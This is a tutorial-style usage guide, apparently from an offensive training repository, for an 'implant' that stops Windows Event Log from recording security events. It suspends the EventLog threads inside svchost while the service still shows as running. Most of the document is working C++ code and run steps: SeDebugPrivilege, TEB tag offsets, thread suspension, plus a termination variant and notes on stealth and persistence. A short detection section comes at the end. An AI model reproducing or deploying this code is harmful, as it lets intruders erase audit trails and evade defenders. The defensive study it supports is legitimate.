## Usage Guide for High-privileged user vector (Local-admin)

<details>
<summary>01 - Blinding Eventlog 2</summary>

## Overview

Event Log blinding is a technique that suspends Windows Event Log service threads to prevent security events from being recorded while maintaining the appearance of a normally running service. This method was reportedly used by advanced threat actors like NSA to avoid detection during operations.

## Technical Implementation

### Step 1: Understanding the Technique

The technique works by:
1. **Identifying Event Log Service Process**: Locating the specific svchost.exe instance hosting the EventLog service
2. **Thread Identification**: Finding only the threads specifically responsible for event logging
3. **Selective Suspension**: Suspending only event log-related threads while leaving other service threads running
4. **Stealth Maintenance**: Keeping the service apparently running to avoid detection

### Step 2: Practical Demonstration

#### Setting Up Event Monitoring

**Open Event Viewer and Create Custom View:**
1. Launch Event Viewer (`eventvwr.msc`)
2. Create a new Custom View
3. Include all Windows logs and all Event IDs
4. Name it "All Windows Logs" for monitoring

**Generate Test Events:**
- Open Local Security Policy (`secpol.msc`)
- Make policy changes to generate security events
- Observe new events appearing in the custom view

#### Manual Thread Suspension Test

**Using Process Explorer:**
1. Locate the Event Log service process (svchost.exe hosting EventLog)
2. Open the Threads tab
3. Manually suspend all Event Log-related threads
4. Make additional policy changes
5. **Observation**: No new events appear in Event Viewer
6. Resume threads to see queued events flood in

### Step 3: Code Implementation

#### Compile and Run the Demonstration

Open **Developer Command Prompt for VS** with Administrator privileges:

```batch
cd 01.BlindingEventlog
compile.bat
implant.exe
```

#### Code Walkthrough

**Step 3.1: Privilege Escalation**

```cpp
// Enable SE_DEBUG_NAME privilege required for process manipulation
if (!SetPrivilege(SE_DEBUG_NAME, ENABLE)) {
    printf("Boooo! No powers, we die!\n");
    return -1;
}
```

**Why Admin Privileges Are Required:**
- Manipulating system services requires elevated privileges
- `SE_DEBUG_NAME` privilege allows process and thread manipulation
- Without this privilege, the technique will fail

**Step 3.2: Locating Event Log Service Process**

```cpp
// Talk to Service Manager to find Eventlog process
SC_HANDLE sc = OpenSCManagerA(".", NULL, MAXIMUM_ALLOWED);
SC_HANDLE svc = OpenServiceA(sc, "EventLog", MAXIMUM_ALLOWED);

// Get PID of svchost.exe that hosts EventLog service
QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE) &svcStatus, 
                    sizeof(svcStatus), &bytesNeeded);
DWORD svcPID = svcStatus.dwProcessId;

printf("svchost with eventlog - PID: %d\n", svcPID);
```

**Service Manager Interaction:**
- `OpenSCManagerA` connects to the Service Control Manager
- `OpenServiceA` opens the EventLog service specifically
- `QueryServiceStatusEx` retrieves the hosting process ID

**Step 3.3: Thread Enumeration and Identification**

```cpp
// Get snapshot of all threads in the system
hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
te32.dwSize = sizeof(THREADENTRY32);

// Parse the snapshot and search for threads belonging to eventlog
do {
    if (te32.th32OwnerProcessID == svcPID) {
        // Found thread from EventLog-hosting svchost
        // Thread identification logic continues...
    }
} while (Thread32Next(hThreadSnap, &te32));
```

**Thread Snapshot Process:**
- `CreateToolhelp32Snapshot` captures all running threads
- `Thread32First` and `Thread32Next` iterate through the thread list
- Filter threads by owner process ID to find only EventLog service threads

**Step 3.4: Service Tag Identification**

```cpp
// Get function pointers for internal APIs
NtQueryInformationThread_t pNtQueryInformationThread = 
    (NtQueryInformationThread_t) GetProcAddress(GetModuleHandle("ntdll.dll"), 
    "NtQueryInformationThread");
I_QueryTagInformation_t pI_QueryTagInformation = 
    (I_QueryTagInformation_t) GetProcAddress(GetModuleHandle("advapi32.dll"), 
    "I_QueryTagInformation");

// Query thread basic information to get TEB address
NTSTATUS status = pNtQueryInformationThread(hThread, 
    (THREAD_INFORMATION_CLASS) 0, &threadBasicInfo, 
    sizeof(threadBasicInfo), NULL);
```

**Internal API Usage:**
- `NtQueryInformationThread` retrieves Thread Environment Block (TEB) address
- `I_QueryTagInformation` translates service tags to service names
- These are undocumented but stable Windows APIs

**Step 3.5: Architecture-Specific Offset Calculation**

```cpp
// Check if svchost.exe is 32- or 64-bit, offset in TEB is different for each arch
bIsWoW64 = IsWow64Process(hSvcProc, &bIsWoW64);
if (!bIsWoW64)
    dwOffset = 0x1720;  // 64-bit offset
else
    dwOffset = 0xf60;   // 32-bit offset

// Read subProcessTag value from TEB of svchost.exe
ReadProcessMemory(hSvcProc, 
    ((PBYTE)threadBasicInfo.pTebBaseAddress + dwOffset), 
    &subProcessTag, sizeof(subProcessTag), NULL);
```

**TEB Structure Differences:**
- 64-bit Windows: SubProcessTag at offset 0x1720 in TEB
- 32-bit Windows: SubProcessTag at offset 0xf60 in TEB
- `IsWow64Process` detects the process architecture

**Step 3.6: Service Name Verification and Thread Suspension**

```cpp
SC_SERVICE_TAG_QUERY query = { 0 };
query.processId = (ULONG) svcPID;
query.serviceTag = (ULONG) subProcessTag;
query.reserved = 0;
query.pBuffer = NULL;

pI_QueryTagInformation(NULL, ServiceNameFromTagInformation, &query);

if (_wcsicmp((wchar_t *) query.pBuffer, L"eventlog") == 0) {
    printf("[!] Eventlog thread FOUND: %d. Suspending...", te32.th32ThreadID);
    if (SuspendThread(hThread) != -1)
        printf("done!\n");
    else
        printf("failed!\n");
}
```

**Service Tag Verification:**
- `I_QueryTagInformation` converts the numeric tag to service name
- Compare with "eventlog" to identify Event Log-specific threads
- Only suspend threads confirmed to belong to Event Log service

## Practical Demonstration

### Step 4: Running the Implant

**Execute with Administrator Privileges:**
```batch
implant.exe
```

**Expected Output:**
```
svchost with eventlog - PID: 1234
[!] Eventlog thread FOUND: 1192. Suspending...done!
[!] Eventlog thread FOUND: 1220. Suspending...done!
[!] Eventlog thread FOUND: 1224. Suspending...done!
[!] Eventlog thread FOUND: 1228. Suspending...done!
[!] Eventlog thread FOUND: 1232. Suspending...done!
```

**Verification Steps:**

1. **Check Thread Status in Process Explorer:**
   - Open Process Explorer as Administrator
   - Locate the EventLog-hosting svchost.exe process
   - Check Threads tab - suspended threads show suspended state
   - Compare thread IDs with implant output

2. **Test Event Logging:**
   - Make system changes that normally generate events
   - Open Local Security Policy and modify settings
   - Check Event Viewer - no new events should appear
   - The events are buffered but not written to disk

3. **Service Status Check:**
   - Open Services.msc
   - Event Log service shows "Running" status
   - The service appears normal to monitoring tools

### Step 5: Important Considerations

**Event Buffering Behavior:**
- Events continue to be generated and buffered in memory
- If threads are resumed, buffered events will be written to disk
- System reboot clears the event buffers permanently

**Stealth Advantages:**
- Service continues to show "Running" status
- No service crash or abnormal termination
- Only specific logging threads are suspended
- Other service functionality remains intact

## Technical Deep Dive

### Step 6: Understanding Service Host Architecture

**Windows Service Host Model:**
```
svchost.exe (PID: 1234) - Service Host Process
├── Thread 1192 (EventLog service - SUSPENDED)
├── Thread 1220 (EventLog service - SUSPENDED) 
├── Thread 1224 (EventLog service - SUSPENDED)
├── Thread 1228 (EventLog service - SUSPENDED)
├── Thread 1232 (EventLog service - SUSPENDED)
└── Thread 1300 (Other service - RUNNING)
```

**Why Selective Thread Targeting:**
- Multiple services can run in single svchost.exe process
- Suspending all threads would affect other services
- Service tags identify threads belonging to specific services
- Maintains stealth by only affecting Event Log functionality

### Step 7: Advanced Techniques

**Alternative: Thread Termination**
```cpp
// Instead of suspending, threads can be terminated
if (TerminateThread(hThread, NULL))
    printf("Thread terminated successfully\n");
```

**Considerations for Termination:**
- More destructive than suspension
- May cause service instability
- Easier to detect than suspension
- Not recommended for stealth operations

**Persistence Considerations:**
- Suspended threads remain suspended until resumed
- System reboot will restore normal operation
- For persistent blinding, implant would need to run periodically

## Detection and Mitigation

### Detection Opportunities

**Behavioral Indicators:**
- Multiple thread suspensions in service host processes
- `SuspendThread` API calls targeting system service threads
- Event log gaps during periods of system activity
- Mismatch between service status and functionality

**Forensic Artifacts:**
- Suspended thread state in memory dumps
- `I_QueryTagInformation` API calls in call stacks
- Service tag query patterns in advanced EDR solutions

### Defensive Strategies

**Service Monitoring:**
```cpp
// EDRs can monitor for service thread manipulation
BOOL MonitorServiceThreads(DWORD servicePid) {
    // Track thread state changes in critical services
    // Alert on multiple thread suspensions in short timeframes
    // Monitor for service tag query patterns
    return IsSuspiciousThreadActivity(servicePid);
}
```

**Integrity Checking:**
- Regular verification of service thread states
- Monitoring for event log gaps and inconsistencies
- Alerting on service manipulation attempts

## Building the Project

### Prerequisites
- Visual Studio 2019 or later
- Windows SDK
- Administrator privileges for testing

### Compilation
```batch
cd 01.BlindingEventlog
compile.bat
```

### Required Libraries and Headers
```cpp
#include <windows.h>
#include <Strsafe.h>
#include <tlhelp32.h>

#pragma comment(lib,"Advapi32.lib")
#pragma comment(lib,"shell32.lib")
```

## References

- Windows Internals, 7th Edition - Service Architecture
- MITRE ATT&CK: T1562.002 (Impair Defenses: Disable Windows Event Logging)
- Advanced threat actor techniques research
- Windows Service Control Manager Documentation
  
</details>

